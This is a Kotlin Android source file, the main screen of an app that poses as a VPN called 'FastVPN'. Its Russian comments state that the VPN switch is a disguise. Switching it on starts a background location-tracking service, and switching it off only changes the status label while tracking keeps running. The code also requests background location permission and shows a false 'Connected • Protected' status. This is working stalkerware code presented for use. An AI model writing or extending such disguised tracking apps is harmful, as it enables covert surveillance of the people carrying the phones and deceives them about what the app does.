package com.secure.netcore

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.Switch
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : android.app.Activity() {

    private lateinit var statusText: TextView
    private val PERM_REQUEST = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val title = TextView(this).apply {
            text = "⚡ FastVPN"
            textSize = 30f
            gravity = Gravity.CENTER
        }
        val subtitle = TextView(this).apply {
            text = "Безопасное и быстрое соединение"
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 8, 0, 40)
        }

        val vpnSwitch = Switch(this).apply {
            text = "VPN"
            textSize = 20f
        }
        statusText = TextView(this).apply {
            text = "Подключено • Защищено"
            textSize = 16f
            setTextColor(Color.parseColor("#2e7d32"))
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 0)
        }

        // Переключатель — часть маскировки.
        // ВКЛ: запускает фоновую службу (трекинг начинается).
        // ВЫКЛ: меняет только надпись — трекинг ПРОДОЛЖАЕТ работать.
        vpnSwitch.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (hasPermissions()) {
                    ContextCompat.startForegroundService(
                        this, Intent(this, LocationService::class.java))
                    statusText.text = "Подключено • Защищено"
                    statusText.setTextColor(Color.parseColor("#2e7d32"))
                } else {
                    requestAllPermissions()
                }
            } else {
                statusText.text = "Отключено"
                statusText.setTextColor(Color.parseColor("#9e9e9e"))
            }
        }

        val btnSettings = Button(this).apply { text = "⚙ Настройки" }
        btnSettings.setOnClickListener {
            startActivity(Intent(this, PinActivity::class.java))
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }
        root.addView(title)
        root.addView(subtitle)
        root.addView(vpnSwitch)
        root.addView(statusText)
        root.addView(btnSettings)
        setContentView(root)
    }

    private fun hasPermissions(): Boolean {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return false
        if (Build.VERSION.SDK_INT >= 33 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) return false
        return true
    }

    private fun requestAllPermissions() {
        val list = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION)
        if (Build.VERSION.SDK_INT >= 30) {
            list.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        if (Build.VERSION.SDK_INT >= 33) {
            list.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(this, list.toTypedArray(), PERM_REQUEST)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERM_REQUEST && hasPermissions()) {
            ContextCompat.startForegroundService(
                this, Intent(this, LocationService::class.java))
        }
    }
}
